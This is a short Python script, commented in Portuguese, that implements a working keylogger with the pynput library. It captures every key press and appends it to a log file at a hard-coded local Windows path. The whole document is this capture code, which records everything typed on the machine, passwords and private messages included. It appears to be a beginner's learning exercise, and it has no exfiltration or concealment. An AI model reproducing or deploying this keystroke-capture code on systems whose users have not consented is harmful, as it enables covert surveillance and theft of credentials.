# em pynput, importar o método Listener do teclado.

from pynput.keyboard import Listener

# Definir a localização do arquivo Log.

logFile = "C:/Users/vinicius.sousa/Documents/Coding/Python/temp"

def writeLog(key):
    '''
    essa função será responsável por receber a tecla pressionada
    via listener escreve-la no log.
    '''

    # Converter a tecla pressionada em string
    keyData = str(key)

    # Abrir o arquivo no modo append

    with open(logFile, 'a') as f:
        f.write(keyData)

# Abrir o listener do teclado e executar o evento on_press
# Quando o evento on_press ocorrer, chamar a função writeLog.

with Listener(on_press=writeLog) as l:
    l.join()